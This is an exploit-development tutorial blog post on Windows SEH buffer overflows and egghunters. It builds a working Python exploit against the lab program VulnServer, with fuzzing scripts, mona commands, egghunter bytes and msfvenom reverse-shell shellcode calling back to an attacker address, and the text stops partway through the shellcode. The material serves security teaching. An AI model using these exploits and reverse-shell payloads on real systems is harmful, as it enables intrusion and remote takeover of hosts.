---
title: Win32 Buffer Overflow - SEH Overflows & Egghunters
tags: [Buffer Overflow,Exploit Development,Windows,SEH,Egghunting,OSCE]
description: SEH is a mechanism within Windows that makes use of a data structure/layout called a Linked List which contains a sequence of memory locations. When a exception is triggered the OS will retrieve the head of the SEH-Chain and traverse the list and the handler will evaluate the most relevant course of action to either close the program down graceful or perform a specified action to recover from the exception.
thumbnail: https://png.pngtree.com/element_our/sm/20180224/sm_5a90fde8c56d5.png
published: true
---




<p align = "center">
<img src = "https://png.pngtree.com/element_our/sm/20180224/sm_5a90fde8c56d5.png">
</p>



# Introduction



I recently wrote a tutorial on Simple Win32 Buffer-Overflows where we exploited one of the most simple Buffer Overflows around; **Stack-Overflow** aka **EIP Overwrite** which you can read [Here](https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html)



At the start of the article I discussed how I recently embarked on a mission to learn exploit development better and the purpose of this mini-series was too have reason to put pen to paper and finally learn all this shit :) - Now in this article I want to move on a little bit from basic **Stack Overflows** and progress to **SEH - Structured Exception Handling** Overflows. 



Now of course it is fairly obvious that the exploits I am talking about here are fairly old, think *WinXP* days and a lot of this stuff has been mitigated with new technologies such as **DEP / ASLR** etc, but as I said in Part-1 you have to learn the old stuff before you learn the new stuff. 



Let's jump right into it. 



**Table of Contents:** 

   * <a href="#introduction"> Introduction</a>
      * <a href="#exception-handlers-101">Exception Handlers 101</a>
           * <a href="#what-is-an-exception">What is an Exception?</a>
           * <a href="#different-types-of-handlers">Different Types of Handlers</a>
           * <a href="#so-how-do-structured-exception-handlers-work">So How Do Structured Exception Handlers Work?</a>
           * <a href="#the-vulnerability">The Vulnerability</a>
           * <a href="#a-mention-on-pop-pop-ret">A Mention on POP POP RET</a>
              * <a href="#why-do-we-pop-pop-ret">Why Do we POP POP RET?</a>
              * <a href="#finding-pop-pop-ret-modules--instructions">Finding POP POP RET Modules &amp; Instructions</a>
      * <a href="#egghunters-101">Egghunters 101</a>
           * <a href="#what-is-an-egghunter">What is an Egghunter?</a>
           * <a href="#so-how-do-egghunters-work">So How Do Egghunters Work?</a>
           * <a href="#a-word-on-ntdisplaystring">A Word on NTDisplayString</a>
   * <a href="#examples">Examples</a>
      * <a href="#vulnserver-w-egghunter">VulnServer w/ Egghunter</a>
         * <a href="#fuzzing--finding-the-crash">Fuzzing &amp; Finding the Crash</a>
         * <a href="#finding-the-offset">Finding the Offset</a>
         * <a href="#finding-bad-chars">Finding Bad Chars</a>
         * <a href="#finding-pop-pop-ret-instruction">Finding POP POP RET Instruction</a>
         * <a href="#generating-egghunter">Generating Egghunter</a>
         * <a href="#jumping-to-egghunter">Jumping to Egghunter</a>
         * <a href="#generating-shellcode--final-exploit">Generating Shellcode &amp; Final Exploit</a>
      * <a href="#easy-file-sharing-web-server-72-wo-egghunter">Easy File Sharing Web Server 7.2 w/o Egghunter</a>
         * <a href="#fuzzing--finding-the-crash-1">Fuzzing &amp; Finding the Crash</a>
         * <a href="#finding-the-offset-1">Finding the Offset</a>
         * <a href="#finding-bad-chars-1">Finding Bad Chars</a>
         * <a href="#finding-pop-pop-ret-instruction-1">Finding POP POP RET Instruction</a>
         * <a href="#generating-shellcode">Generating Shellcode</a>
         * <a href="#final-exploit">Final Exploit</a>
   * <a href="#references--resources">References / Resources</a>





##  Exception Handlers 101



Before we jump into looking at this from a exploitation perspective let's first talk about what **Exception Handlers** *really are*, the different types and what purpose they service within the Windows OS. 



####  What is an Exception?



*An exception is an event that occurs during the execution of a program/function*



####  Different Types of Handlers



**Exception Handler (EH)** - Piece of code that will attempt to *do something* and have pre-defined courses to take depending on the outcome. For example, try do this if you fail do this. 

**Structured Exception Handler (SEH) - ** Windows in-built Exception Handler that can be used to fallback on if your development specific Exception Handler fails or to be used primarily.

**Next Structured Exception Handler (nSEH) - **



Now as you can see above I have mentioned **EH/SEH** truthfully because **Exception Handlers** are split up into two different categories, *OS Level* handlers and/or Handlers implemented by developers themselves. As you can see Windows has an *OS Level* called **SEH**.



So basically **Exception Handlers** are pieces of codes written inside a program, with the sole purpose of dealing any *exceptions* or errors the application may throw. For example:



```c#
try
{
    // Code to try goes here.
}
catch (SomeSpecificException ex)
{
    // Code to handle the exception goes here.
}
finally
{
    // Code to execute after the try (and possibly catch) blocks 
    // goes here.
}
```



The above example represents a basic exception handler **(EH)** in `C#` implemented by the developer - Sometimes looking at code like above can be quite scary to a non-programmer but all we are really doing is saying `try` run this piece of code & if an error/exception occurs do whatever the `catch` block contains. Simple!



Now it is not uncommon for software developers to write there own exception handlers to manage any errors/warnings there software may through but **Windows** also has one built in called **Structured Exception Handler (SEH)** which can throw up error messages such as `Program.exe has stopped working and needs to close` - I'm sure you have all seem them before. 



It is also worth mentioning that no matter where the **Exception Handler** is defined whether it be at the **OS-Level** and/or **Developer Level** that all **Handlers** are controlled and managed centrally and consistently by the **Windows SEH** via a collection of designated memory locations and *functions*.




####  So How Do Structured Exception Handlers Work?



So, How do they work? Well SEH is a mechanism within Windows that makes use of a data structure/layout called a **Linked List** which contains a sequence of memory locations. When a exception is triggered the OS will retrieve the head of the **SEH-Chain** and traverse the list and the handler will evaluate the most relevant course of action to either close the program down graceful or perform a specified action to recover from the *exception*.  (More on the linking later)



When we run an application its executed and each respective **function** that is ran from within *the application* there is a **stack-frame** created before finally being ***popped*** off after the function *returns* or finishes executing.  Now the same is actually true for **Exception Handlers**. Basically if you run a function with a **Exception Handler** embedded in itself- that exception handler will get it's own dedicated **stack-frame**





<p align="center">
<img src="https://www.ethicalhacker.net/wp-content/uploads/features/root/seh_overflow/image3.png">
</p>



*Source: ethicalhacker.net*



As you can see each **code-block** has it's own **stack-frame**, represented by the arrows linking each respective *frame*. 



So... How are they linked? Well for every **Exception Handler**, there is an **Exception Registration Record** configured which are all chained together to form a linked list. The **Exception Registration Record** contains numerous fields but namely the `_EXCEPTION_REGISTRATION_RECORD *Next;` which defines the next **Exception Registration Record** in the **SEH Chain** - This is what allows us too navigate the **SEH Chain** from *top-to-bottom*.



Now, you might be wondering how **Windows SEH** uses the **Exception Registration Record** & **Handlers** etc. Well when an exception occurs, the OS will start at the top of the **SEH Chain** and will check the first **Exception Registration Record** to see if it can handle the exception/error, if it can it will execute the code block defined by the pointer to the **Exception Handler** - However if it can't it will move down the **SEH Chain** utilizing the `_EXCEPTION_REGISTRATION_RECORD *Next;` field to move to the *next record* and it will continue to do so all the way down the chain until it finds a *record/handler* that is able to handle the exception. 



But what if none of the pre-defined exception handler functions are applicable? Well windows places a default/generic exception handler at the bottom of every **SEH Chain** which can provide a generic message like `Your program has stopped responding and needs to close` - The generic handler is represented in the picture above by `0xffffff`



The below image provides a simplified overview of the overall **SEH Chain**

<p align="center">
<img src="https://i.imgur.com/3foqbVO.png">
</p>



We can also view the **SEH Chain** with **Immunity** by loading our binary and hitting `Alt+S` - As you can see in the picture below we have the **SEH Chain** highlighted in green in the bottom left as well as the **SEH Record / SEH Handler** highlighted in blue on the stack.



<p align ="center">
<img src = "https://i.imgur.com/5AxSbCQ.png">
</p>



In this case we actually have 2 Handlers specified by **SEH Records** - The first is a normal implemented handler and the 2nd one at address `0028FFC4` is Window's **OS Level** handler which we can see in the screenshot below.



<p align="center">
<img src="https://i.imgur.com/9IH93dV.png">
</p>



#### The Vulnerability



So to just recap, we have covered what exceptions are, the different types of handlers and we have also spoken about how **Structured Exception Handlers** *really* work, so now we should probably talk about this from an attackers point of view and how we can exploit these handlers to gain control over a programs execution flow similar to the `EIP Overwrite` in Part 1.



Now in Part 1 [Here](https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html) - We were able to control the *execution flow* over VulnServer & SLMail to redirect it too our own *shellcode* and pop a reverse shell, now of course this was a really old vulnerability and SEH was supposed to resolve this but it was a really poor implementation and soon exploited itself. 



Now I don't want to show off a crazy example here as I will cover it in the **Examples** section below, but the theory here is we do not overwrite EIP with user control input but instead overwrite the pointer to **next SEH record** aka **Exception Registration Record** as well as the pointer to the **SE Handler** to an area in memory which we control and can place our shellcode on.



<p align ="center">
<img src="https://i.imgur.com/GQMPjbu.png">
</p>



As you can see here we have not overwritten the **EIP Register** with `41414141` similar to Part1 but instead overwritten the pointers to **SE Handler** and **SEH Record**. Now before we jump to talking about Egghunters and how they can be of use when doing *SEH Overflows* - I quickly want to show you how we can control the **EIP Register** compared to the pointers to **SE Handler** and **SEH Record**.



I won't go into deep specifics but this if we can *fuzz* a never-repeating string and then calculate the offset that we overwrite the **SE Handler** & **SE Record** with data of our choice which could be used to control EIP. 



With the below example I analyzed that the offset too **SE Record** was `3519 Bytes` therefore I added 4 x B's over **SE Record** and 4 x C's over **SE Handler**. Check out the script below.



```python
#!/usr/bin/python
import socket
import sys


nseh = "BBBB" 
seh = "CCCC"

buffer="A" * 3515
buffer += nseh
buffer += seh

junk = "D"*(4500-len(buffer))
buffer += junk

try:
	print "[*] Starting to Fuzz GMON"
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',9999))
	print "[*] Connected to bof.local on Port 9999"
	s.send(('GMON /.:/' + buffer))
	print "[*] Finished Fuzzing Check SEH Chain on Immunity"
	s.close()
except:
	print "couldn't connect to server"
```





Now if we jump over **Immunity** and check out the **SEH Chain** we will see the below.



<p align = "center">
<img src ="https://i.imgur.com/JWDAV87.png">
</p>



Let me first show you something, at the current moment the application is in a crashed state (of course) but we can still pass the exception to program by pressing **Shift+F9** - If we do this we can notice something interesting.



The value of **SE Handler** on the stack is pushed to the **EIP Register**  which of course is not ideal! We can now control the execution flow of the overall program.




<p align ="center">
<img src ="https://i.imgur.com/2QC3RBq.png">
</p>





####  A Mention on POP POP RET



So as you can see in the above screenshots/examples we are effectively living in the land or area of the **SE Handler** which is not really good due to the limitations with space and how small of an area of memory we have to work with, of course we may be able to bring Egghunters into the mix but I will talk about that later in this article. I want to first talk about the `POP POP RET` technique which is commonly coupled with **SEH Overflows.**



**What is POP POP RET?**



Now really the `POP POP RET` is really how it sounds we replace the **SE Handler** value with the memory address of a `POP POP RET` instruction, this will technically run these assembly instructions which will lead us to the **nSEH.** 



It's worthwhile mentioning that the registers to which the *popped* values go to are not important, we simply just need to move the value of **ESP** *higher twice* and then a return to be executed. Therefore either *POP EAX*, *POP EBC, POP ECX* etc will all be applicable providing there is a relevant `RET` instruction after the 2 *pops*



#####  Why Do we POP POP RET?



Now if you think back to [Part 1](https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html) - Once we had gained control over our **return address** and **EIP** we located a **JMP ESP** instruction to jump to the top of our stack frame where our shell code and NOPs were sliding and we gained code execution. Now if we try to add a memory location of a **JMP ESP** instruction to the **SE Handler**, windows will automatically zero-out all registers to prevent users from jumping to there shellcode but this is a really flawed protection mechanism. 



You can actually see in the below screen that **ESI** & **EDI** have been zeroed out to help mitigate an attacker jumping straight to shellcode.



<p align ="center">
<img src ="https://i.imgur.com/2QC3RBq.png">
</p>





Now this is where `POP POP RET` comes into play, Let's first just remember about the layout of the **SEH Record** & **Handler** on the stack



<p align = " center">
<img src = "https://i.imgur.com/twqbeGT.png">
</p>

Now let's think about what **POP POP RET** would do here, *POP (move up 4 bytes)*, *POP (move up 4 bytes)* & *RET (simple return, send address to EIP as next instruction to execute)* - Now we have full control ;) 




<p align = "center">
<img src = "https://i.imgur.com/d5nszIb.png">
</p>







#####  Finding POP POP RET Modules & Instructions



Now I do not want to go into depth here with how we find applicable modules and instructions as I will cover it in the examples section but the long story short is **mona**



Similar to [Part 1](https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html) where we used **mona** intensively it will also be of use when carrying out **SEH Overflows** - All we have to do is issue the below command



```python
!mona seh
```



This will automatically search all available modules for a `POP POP RET` sequence.




<p align = "center">
<img src = "https://i.imgur.com/6TO0wiB.png">
</p>



Now just like exploit we have to ensure that we choose a module with 0 bad chars in the memory address as well as avoid and *SEH Safeguards* such as **SafeSEH**, which I will talk about a later.



***






## Egghunters 101





#### What is an Egghunter?



*An Egghunter is a small piece of shellcode, typically 32 Bytes that can be used to search all memory space for our final-stage shellcode*





#### So How Do Egghunters Work?



https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf



I would like to provide a high level overview of how Egghunters work here without going crazy in depth, as I have already said above 



*An Egghunter is a small piece of shellcode, typically 32 Bytes that can be used to search all memory space for our final-stage shellcode*



This sounds great but why not just jump to our shellcode with a simple **Short JMP** or **JMP ESP** - Well imagine you have very little space to work with, let's say for example **50 bytes**. This is nowhere near enough space to place some shell code but it is enough to place a **32 Byte Egghunter**



Providing we can get our **32 Byte** hunter onto the stack/memory and we are able to redirect execution to the location of the hunter we can tell the hunter to search the whole memory space for a pre-defined tag such as `MOCH` and our shellcode would be placed directly after this tag aka the **egg**



So execution flow would look something like this



1. Gain Control over Execution
2. Jump to Small Buffer Space containing **32 Byte Egghunter**
3. Egghunter executes and searches all of memory for a ***pre-defined egg***
4. Egghunter finds **egg** & executes shellcode placed *after* **egg**



#### A Word on NTDisplayString



In this article we will be using the **32 Byte** Egghunter which makes use of the `NTDisplayString` system call which is displayed as



```c++
NTSYSAPI 
NTSTATUS
NTAPI

NtDisplayString(

  IN PUNICODE_STRING      String );
```

[Reference][https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html]



`NTDisplayString` is actually the same system-call used too display blue-screens within Windows, So how does this come into play with our **Egghunter?**



Well we abuse the fact that this system call is used to validate an address range & the pointer is read from and not written too. 



There is a small downside to this method, the system call number for `NTDisplayString ` can't change and across the years system call numbers have changed across versions of Windows as well as architecture. 



When I was writing this article I actually ran into some issues with my Egghunter showing `Access Violation reading: FFFFFF` when executing `INT 2E` aka a system call. The reason?



Because I was trying to run the Egghunter on a 64bit arch of Windows, kind of stupid of me but I did not give it much thought due to the application being compiled as a 32bit application and not having much issues in the past.



Corelan did a great job explaining what each assembly instruction of an Egghunter does so please check out there article [Here](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/)



***



# Examples





## VulnServer w/ Egghunter



In this example I am going to go over **VulnServer** which is an intentionally vulnerable server that listens on port 9999 for any incoming connections and supports numerous types of commands as previously saw in Part 1. 



### Fuzzing & Finding the Crash



Now similar to [Part 1](https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html) I do not want to demonstrate fuzzing every single available command on **VulnServer** If you're looking for something like that check our **booFuzz** it's pretty cool. In this case I am only going to fuzz the `GMON` command to save time and to focus on the exploitation part itself.



Let's kick it off with a simple fuzz of this command with the below script.



```python
#!/usr/bin/python
import socket
import sys

buffer=["A"]
counter=100

while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200


for string in buffer:
	print "[*] Starting to Fuzz GMON with %s bytes" %len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',9999))
	print "[*] Connected to bof.local on Port 9999"
	s.send(('GMON /.:/' + string))
	s.close()
print "[*] Finished Fuzzing GMON with %s bytes" %len(string)
```



What we are doing here is very similar to the basic stack-overflow we covered in Part 1, in which we are doing the following



1. Connect to **bof.local** on **Port 9999**
2. Send `GMON /.:/ + string += 200` - Where string = `A` and increments by `200` each cycle.
3. Close TCP Connection



Once the application has crashed the script will seize running and we can check out **Immunity**.



Now when we jump over to Immunity we may notice some interesting stuff, the first thing I notice is `Access Violation when writing to [06500000]` along the footer of Immunity, this is telling us that the application is in a crashed state and really does not know what to *do next* - You may also notice that the **EIP** value is looking normal unlike Part 1 where it contained `41414141` - This is due to the fact we have not over run the return address and gained control over the **EIP Register** but instead overrun the **nSEH** and **SEH** values on the stack.



Let's bring up the **SEH Chain** by pressing `ALT+S` within Immunity. Upon doing so we will notice something interesting the `41414141` output we are used to seeing in the **EIP Register** is now showing in **SE Handler**. Right click `41414141` and select `Follow in Stack`



<p align = "center">
<img src = "https://i.imgur.com/6s24FFd.png">
</p>





Perfect, we are now able to override the pointer to **nSEH** & **SEH** with user-supplied input. Let's now find out how much user-supplied input has to be provided in order to get to the pointer of **nSEH** and **SEH**



### Finding the Offset





Here we are again, finding the offset as I am sure you are aware this is a very common piece of exploit development and does not just apply to **SEH Overlows** - There are a couple different ways to do this such as *manually*, **metasploit** and **mona** but I will stick to **mona** here due to preference.



Let's first create a never-repeating string / cyclic pattern with the below command

```python
!mona pc 6000
```



And couple this with our fuzzing script but instead of repeating A's incrementing by 200 bytes each time let's simply just send our pattern alongside `GMON :./`



```python
#!/usr/bin/python
import socket
import sys

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa...."



print "[*] Starting to Fuzz GMON with pattern containing %s bytes" %len(buffer)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',9999))
print "[*] Connected to bof.local on Port 9999"
s.send(('GMON /.:/' + buffer))
s.close()
print "[*] Finished Fuzzing GMON with %s bytes" %len(buffer)
```





Our application will now return to a crashed state and report a `Access Violation` but this time **SE Handler** contains `45336E45` in comparison to `41414141` - Let's jump to the stack again and check out data residing on the stack at present.




<p align = "center">
<img src = "https://i.imgur.com/zor6poD.png">
</p>



Perfect! As you can see we are looking at our never-repeating string and can not calculate the offset by simply using one of the below commands within **mona**



```bash
!mona findmsp
```

```python
!mona po 1En2
```


<p align = "center">
<img src = "https://i.imgur.com/Icsp6ik.png">
</p>



As you can see it took us **3515** **bytes** to overrun the value of **nSEH** and **3519 bytes** to overrun the value of **SE Handler** - Before I jump into beginning to piece everything together I want to first take this time to find any bad chars.



### Finding Bad Chars



I will not go into any explanation here to why we need to find bad chars as I did a pretty good job talking about it in [Part 1](https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html) so head over there. 



Let's use the simple script below to send a string of every single possible character through to **VulnServer** via the `GMON` command. Of course we will exclude the `\x00` character aka the **null-byte.**



```python
#!/usr/bin/python
import socket
import sys


nseh = "B"*4
seh = "C"*4


badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


buffer = "A" * (3515-len(badchars))
print "[*] There are %s" %len(badchars) + " bad chars to test"
print "[*] Starting to Fuzz GMON with %s bytes" %len(buffer) + " A's"
buffer += badchars #All of badchars
buffer += nseh #BBBB
buffer += seh #CCCC
junk = "D"*(5000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space

print "[*] Starting to Fuzz GMON with everything containing %s bytes" %len(buffer)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',9999))
print "[*] Connected to bof.local on Port 9999"
s.send(('GMON /.:/' + buffer))
s.close()
print "[*] Finished Fuzzing GMON with %s bytes" %len(buffer)
```



Now, just to give a brief overview of what we do here



1. Calculate the amount of bad chars and minus that value from `3515` aka our **offset**
2. Send `3260 A's + 255 bad chars`
3. Send `BBBB` to overwrite the **nSEH** value
4. Send `CCCC` to overwrite the **SEH** value
5. Fill remaining space with `DDDD...` 
   1. The reason we do this is we don't fill the remaining space then the **SEH** won't trigger



Ps: Due to the limited size of space after the **SE Handler** aka 52 bytes I decided to send the bad characters before overwriting **nSEH** and **SEH**



Checking the memory dump we can see that we actually have zero bad chars besides the **null-byte** aka `\x00`




<p align = "center">
<img src = "https://i.imgur.com/f41OjZ9.png">
</p>







### Finding POP POP RET Instruction



I have already talked in detail about the `POP POP RET` sequence of instructions and why it's important so I will stick to practical and let the section above `A Mention on POP POP RET` do the talking. 



Let's first find an applicable module which will contain this sequence of instructions using the below command with **mona**



```python
!mona seh
```



Here an obvious choice stands out `efffunc.dll` as it is not compiled with any security mechanisms such as `SafeSEH`  or `ASLR` 



Let's double click the module and just verify the assembly instructions and make sure this is what we need.



<p align = "center">
<img src = "https://i.imgur.com/jYmakpn.png">
</p>





Perfect, we have a `POP EBX` `POP EBP` and `RETN` instruction. This is exactly what we need `POP POP RET`



For this part, I recommened you place a breakpoint at the start of your `POP POP RET` function so you can step-through the next part to understand what happens, you can this by simply double-clicking your selected module in **mona** followed by pressing `F2` on the `POP EBX` instruction. 



Now I will amend my python script to overwrite the `seh` variable with the value of my `POP POP RET` instruction just like below.



```python
#!/usr/bin/python
import socket
import sys


nseh = "B"*4
seh = "\xb4\x10\x50\x62" #0x625010b4 pop,pop,ret



buffer = "A" * 3515
print "[*] Starting to Fuzz GMON with %s bytes" %len(buffer) + " A's"
buffer += nseh #BBBB
buffer += seh #CCCC
junk = "D"*(5000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space

print "[*] Starting to Fuzz GMON with everything containing %s bytes" %len(buffer)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',9999))
print "[*] Connected to bof.local on Port 9999"
s.send(('GMON /.:/' + buffer))
s.close()
print "[*] Finished Fuzzing GMON with %s bytes" %len(buffer)
```



Let's run this script and jump over to **Immunity** again and see what has happened.



Before we check out the stack or memory dump let's quickly check the **SEH Chain**




<p align = "center">
<img src = "https://i.imgur.com/VPMMmtu.png">
</p>





Perfect, the **SE Handler** is pointing to our `POP POP RET` instruction from our selected DLL, this case `0x625010B4` -> `essfunc.dll`





A quick analysis of the stack and memory dump also all looks okay.

<p align = "center">
<img src = "https://i.imgur.com/wLA8gUo.png">
</p>



Of course as we are merely piecing everything together at the moment the application is in a crashed state, however let's send our pass our exception to the program with `Shift+F9` which send the value of **SE Handler** on the stack to the **EIP Register** which in turn will jump to our `POP POP RET` instruction.




<p align = "center">
<img src = "https://i.imgur.com/n888gkn.png".
</p>



Perfect! Exactly what we needed, our **SE Handler** value of `625010B4` in pushed to `EIP` which in turn is our `POP POP RET` instructions as shown at the top left.



Now if we step through by pressing `F7` we will first `POP EBX` `POP EBP` and finally `RETN` which will take us to the value of **nSEH** - In this case `BBBB`



Just to explain in a little more detail what happens here

- **POP EBX** - *POP's* top of stack into **EBX Register** - ***7DEB6AB9***
- **POP EBP** - *POP's* top of stack into **EBP Register** - ***0237ED34***
- **RETN** - *Returns* / pushes value at the top of the stack into **EIP Register** - ***0237FFC4***



Now you may notice that ***0237FFC4*** looks familiar, if we check out **SEH Chain** again we will see that ***0237FFC4*** corresponds to **nSEH**



<p align = "center">
<img src = "https://i.imgur.com/NfiHe4e.png">
</p>




<p align = "center">
<img src = "https://i.imgur.com/6MReMKJ.png">
</p>



As you can see **EIP** points too `024FFFC4` which relates to the instruction at the top left, looking at said instructions we can see ` 42 42 42 42` which represents our `"B"*4` 







### Generating Egghunter



As I have already talked about why we use Egghunters and how they work I will jump straight into it, first let's analyze the stack and what are working with here.



<p align = "center">
<img src = "https://i.imgur.com/DgCBQu8.png">
</p>





As previously mentioned it takes **3515 Bytes** to get too **nSEH** and **3519 Bytes** to overwrite the pointer to **SE handler** and afterwards we have **52 Bytes** of space, in this case represented by `DDDDD...` - Of course 52 bytes is not enough space for our *shellcode* but it is enough for a Egghunter as we only require **32 Bytes** - Providing we can get our shellcode onto memory via other means with the relevant Egghunter *tag* we should be able to execute just fine. 



As per usual I will be using **mona** to assist me with this stage due to simplicity. 



**Generating Egghunter with Mona**



```python
!mona egg -t MOCH
```



By default **mona** will generate an Egghunter with the default tag of `w00t` which will work perfectly fine but here I have chose to specify a custom tag of `MOCH`



Perfect, now let's add this to our exploit script 



```python
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
```



It's worth noting that Egghunters should be checked for previously discovered bad characters also.



We will also define our `tag` inside a variable **<u>TWICE</u>** so that the Egghunter does not find itself when executing and searching memory.



```python
egg = 'MOCHMOCH'
```



I will also take this time to replace the `junk` variable with

```python
buffer += egghunter
junk = "D"*(5000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space
```



This will allow us to add the Egghunter shell code straight after **SEH** followed by a bunch of D's to fill the remaining space just to be careful. 



Let's now generate some shell code, make some last adjustments to the overall exploit and give it a try. 



### Jumping to Egghunter



Now just to reiterate what are aiming to do here is over run **SEH**, perform a `POP POP RET` sequence which in turns pushes the value of **nSEH** into the **EIP Register** - In this case we would like to either place the address of our Egghunter over **nSEH** or some form of instructions that will jump us down into our Egghunter shellcode, once again if we check out the stack we can see we don't have far too travel.









### Generating Shellcode & Final Exploit



As always I will be using MSFVenom here to generate some shellcode as we are not really fighting against advanced anti-virus or anything so no need to be fancy, let's just simply use the below code.



```bash
m0chan@kali:/> msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
```





Great shell code is now generated we simply just pop this into our final exploit.


<p align = "center">
<img src = "https://i.imgur.com/tRgUMxp.png">
</p>





In this case you can see we will jump from memory address ***0237FFC4*** down to ***0237FFCC*** which will be where our Egghunter will sit. 



Now here we would just overwrite the address of **nSEH** with ***0237FFCC*** but like I said it's not very practical, and it is better practice to just do a simple short jump aka opcode `EB` - However there is a small twist. the `EB` instruction is only **2 Bytes** and **nSEH** expects **4 Bytes.**



This isn't a huge problem as we can simple just use `NOPS` aka `\x90` so what we will do here is fill **nSEH** with `\x90\x90` which means **2/4 bytes** are full followed by our `EB` instruction `\xeb\x06` which stands for jump 6 bytes.  Now **4/4 bytes** are filled within **nSEH** 



Our exploit will now technically jump **8 Bytes** but we only need to jump **6 Bytes** as we are *really* just *sliding* down the **NOPS** so 6 bytes is all that's required.



Great so now update our **nSEH** variable in our exploit to reflect the below



```python
nseh = "\xeb\x06\x90\x90"
```



Of course **little endian** is the reason once again for the reverse order. 





**Final Exploit**



```python
#!/usr/bin/python
import socket
import sys

#Vulnserver GMON SEH Overflow w/ Egghunter
#Author: m0chan
#Date: 28/08/2019

nseh = "\xeb\x06\x90\x90" #0x909006be - nop,nop,jump 6 bytes with EB into egghunter
seh = "\xb4\x10\x50\x62" #0x625010br pop,pop,ret

eggnops = "\x90\x90\x90\x90\x90\x90\x90\x90"

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x74\x65\x65\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

egg = 'MOCHMOCH'

#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 -e x86/shikata_ga_nai EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x80\x0a\x0c\x0d"

shellcode = (
"\xda\xc4\xbf\xcf\xa2\xc0\xf1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x7b\x13\x03\xb4\xb1\x22\x04\xb6\x5e\x20"
"\xe7\x46\x9f\x45\x61\xa3\xae\x45\x15\xa0\x81\x75\x5d\xe4\x2d"
"\xfd\x33\x1c\xa5\x73\x9c\x13\x0e\x39\xfa\x1a\x8f\x12\x3e\x3d"
"\x13\x69\x13\x9d\x2a\xa2\x66\xdc\x6b\xdf\x8b\x8c\x24\xab\x3e"
"\x20\x40\xe1\x82\xcb\x1a\xe7\x82\x28\xea\x06\xa2\xff\x60\x51"
"\x64\xfe\xa5\xe9\x2d\x18\xa9\xd4\xe4\x93\x19\xa2\xf6\x75\x50"
"\x4b\x54\xb8\x5c\xbe\xa4\xfd\x5b\x21\xd3\xf7\x9f\xdc\xe4\xcc"
"\xe2\x3a\x60\xd6\x45\xc8\xd2\x32\x77\x1d\x84\xb1\x7b\xea\xc2"
"\x9d\x9f\xed\x07\x96\xa4\x66\xa6\x78\x2d\x3c\x8d\x5c\x75\xe6"
"\xac\xc5\xd3\x49\xd0\x15\xbc\x36\x74\x5e\x51\x22\x05\x3d\x3e"
"\x87\x24\xbd\xbe\x8f\x3f\xce\x8c\x10\x94\x58\xbd\xd9\x32\x9f"
